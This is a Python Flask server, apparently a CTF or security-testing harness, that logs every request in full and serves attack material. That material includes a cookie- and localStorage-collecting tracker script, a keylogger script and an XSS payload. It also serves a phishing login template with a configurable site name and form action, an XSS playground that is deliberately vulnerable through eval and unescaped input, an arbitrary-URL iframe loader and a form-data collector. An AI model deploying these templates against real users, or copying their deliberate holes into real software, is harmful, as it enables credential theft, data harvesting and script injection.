from flask import Flask, request, send_from_directory, Response, send_file, render_template_string
import json
import logging
from datetime import datetime
import os
import mimetypes
import re

app = Flask(__name__, static_folder='static')

# ログ設定
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('requests.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@app.before_request
def log_request():
    """全てのリクエストをログに記録"""
    log_data = {
        'timestamp': datetime.now().isoformat(),
        'method': request.method,
        'url': request.url,
        'path': request.path,
        'remote_addr': request.remote_addr,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'form': dict(request.form),
        'json': request.get_json(silent=True),
        'data': request.get_data(as_text=True),
        'cookies': dict(request.cookies),
        'user_agent': request.user_agent.string,
        'referrer': request.referrer,
        'scheme': request.scheme,
        'is_secure': request.is_secure,
        'host': request.host,
        'content_type': request.content_type,
        'content_length': request.content_length
    }
    
    logger.info(f"\n{'='*50}\nREQUEST LOG:\n{json.dumps(log_data, indent=2, ensure_ascii=False)}\n{'='*50}")

@app.route('/static/<path:filename>')
def serve_static(filename):
    """静的ファイルの配信"""
    static_dir = os.path.join(app.root_path, 'static')
    if not os.path.exists(static_dir):
        os.makedirs(static_dir)
    
    file_path = os.path.join(static_dir, filename)
    if os.path.exists(file_path):
        return send_file(file_path)
    else:
        return f"File not found: {filename}", 404

@app.route('/js/<path:filename>')
def serve_js(filename):
    """JavaScriptファイルの動的配信"""
    js_dir = os.path.join(app.root_path, 'js')
    if not os.path.exists(js_dir):
        os.makedirs(js_dir)
    
    file_path = os.path.join(js_dir, filename)
    if os.path.exists(file_path):
        return send_file(file_path, mimetype='application/javascript')
    else:
        # 動的にJavaScriptを生成して返す
        dynamic_js = f"""
// Dynamically generated JavaScript
console.log('Dynamic JS loaded: {filename}');
console.log('Request from:', document.location.href);
console.log('User Agent:', navigator.userAgent);

// Track all events
document.addEventListener('DOMContentLoaded', function() {{
    console.log('DOM loaded');
    
    // Log all clicks
    document.addEventListener('click', function(e) {{
        console.log('Click:', e.target.tagName, e.clientX, e.clientY);
    }});
    
    // Log form submissions
    document.addEventListener('submit', function(e) {{
        console.log('Form submit:', e.target.action);
    }});
}});

// Custom payload placeholder
{generate_custom_payload(filename)}
"""
        return Response(dynamic_js, mimetype='application/javascript')

def generate_custom_payload(filename):
    """ファイル名に基づいてカスタムペイロードを生成"""
    payloads = {
        'tracker.js': """
// Tracking payload
(function() {
    var data = {
        url: window.location.href,
        referrer: document.referrer,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        timestamp: new Date().toISOString()
    };
    console.log('Tracking data:', data);
})();
""",
        'keylogger.js': """
// Keylogger payload (for CTF demonstration)
document.addEventListener('keydown', function(e) {
    console.log('Key pressed:', e.key, e.code);
});
""",
        'xss-test.js': """
// XSS test payload
alert('XSS Test - JavaScript Executed!');
document.body.innerHTML += '<div style="color:red;">XSS Payload Executed</div>';
"""
    }
    
    return payloads.get(filename, "// No custom payload for this file")

@app.route('/dom/<path:template>')
def serve_dom(template):
    """カスタムDOMツリーを返す"""
    templates_dir = os.path.join(app.root_path, 'templates')
    if not os.path.exists(templates_dir):
        os.makedirs(templates_dir)
    
    template_file = os.path.join(templates_dir, f"{template}.html")
    
    if os.path.exists(template_file):
        with open(template_file, 'r') as f:
            content = f.read()
        return render_template_string(content, request=request)
    else:
        # 動的にテンプレートを生成
        return generate_dynamic_dom(template)

def generate_dynamic_dom(template_name):
    """動的にDOMツリーを生成"""
    dom_templates = {
        'phishing': """
<!DOCTYPE html>
<html>
<head>
    <title>Login - {{ request.args.get('site', 'Example') }}</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; }
        .login-box { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
    <script src="/js/tracker.js"></script>
</head>
<body>
    <div class="login-box">
        <h2>Login to {{ request.args.get('site', 'Your Account') }}</h2>
        <form action="{{ request.args.get('action', '/login') }}" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="text-align: center; margin-top: 20px;">
            <a href="#">Forgot password?</a>
        </p>
    </div>
</body>
</html>
""",
        'xss-playground': """
<!DOCTYPE html>
<html>
<head>
    <title>XSS Playground</title>
    <script src="/js/xss-test.js"></script>
</head>
<body>
    <h1>XSS Testing Ground</h1>
    <div id="user-content">
        <!-- User input will be reflected here -->
        {{ request.args.get('input', '') | safe }}
    </div>
    <div>
        <h2>Query Parameters:</h2>
        <ul>
        {% for key, value in request.args.items() %}
            <li>{{ key }}: {{ value | safe }}</li>
        {% endfor %}
        </ul>
    </div>
    <script>
        // Vulnerable to DOM-based XSS
        var userInput = "{{ request.args.get('script', '') | safe }}";
        if (userInput) {
            eval(userInput);
        }
    </script>
</body>
</html>
""",
        'iframe-container': """
<!DOCTYPE html>
<html>
<head>
    <title>IFrame Container</title>
    <style>
        iframe { width: 100%; height: 600px; border: 2px solid #333; }
        .controls { padding: 20px; background: #f0f0f0; }
    </style>
</head>
<body>
    <div class="controls">
        <h2>IFrame Loader</h2>
        <p>Loading: {{ request.args.get('url', 'about:blank') }}</p>
    </div>
    <iframe src="{{ request.args.get('url', 'about:blank') }}" 
            sandbox="{{ request.args.get('sandbox', '') }}"
            id="target-frame">
    </iframe>
    <script>
        // Post messages to parent
        window.addEventListener('message', function(e) {
            console.log('Received message:', e.data);
            parent.postMessage('Echo: ' + e.data, '*');
        });
    </script>
</body>
</html>
""",
        'data-collector': """
<!DOCTYPE html>
<html>
<head>
    <title>Data Collector</title>
    <script src="/js/keylogger.js"></script>
</head>
<body>
    <h1>Survey Form</h1>
    <form id="dataForm">
        <label>Name: <input type="text" name="name"></label><br>
        <label>Email: <input type="email" name="email"></label><br>
        <label>Phone: <input type="tel" name="phone"></label><br>
        <label>Comments: <textarea name="comments"></textarea></label><br>
        <button type="submit">Submit</button>
    </form>
    <script>
        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(e.target);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            console.log('Form data collected:', data);
            
            // Send to server
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        });
    </script>
</body>
</html>
"""
    }
    
    if template_name in dom_templates:
        return render_template_string(dom_templates[template_name], request=request)
    else:
        # デフォルトの動的テンプレート
        return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Dynamic Template: {template_name}</title>
    <meta charset="utf-8">
    <script src="/js/tracker.js"></script>
</head>
<body>
    <h1>Dynamic DOM: {template_name}</h1>
    <p>This is a dynamically generated template.</p>
    <div id="dynamic-content">
        <h2>Request Information:</h2>
        <ul>
            <li>Template: {template_name}</li>
            <li>Method: {request.method}</li>
            <li>Path: {request.path}</li>
            <li>User Agent: {request.user_agent.string}</li>
        </ul>
    </div>
    <script>
        console.log('Dynamic template loaded:', '{template_name}');
    </script>
</body>
</html>
"""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    """全てのパスをキャッチ"""
    # クエリパラメータでテンプレートを指定可能
    template = request.args.get('template', 'default')
    
    if template != 'default':
        return generate_dynamic_dom(template)
    
    # デフォルトのHTMLレスポンス
    html_response = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Request Logger</title>
    <script src="/js/tracker.js"></script>
</head>
<body>
    <h1>Request Logged</h1>
    <p>Method: {request.method}</p>
    <p>Path: {request.path}</p>
    <p>Full URL: {request.url}</p>
    
    <h2>Available Templates:</h2>
    <ul>
        <li><a href="/dom/phishing?site=Google&action=/fake-login">Phishing Template</a></li>
        <li><a href="/dom/xss-playground?input=<script>alert('XSS')</script>">XSS Playground</a></li>
        <li><a href="/dom/iframe-container?url=https://example.com">IFrame Container</a></li>
        <li><a href="/dom/data-collector">Data Collector</a></li>
    </ul>
    
    <h2>Dynamic Template:</h2>
    <p>Add ?template=NAME to any URL to load a custom template</p>
    
    <script src="/js/custom.js"></script>
</body>
</html>
"""
    return html_response, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)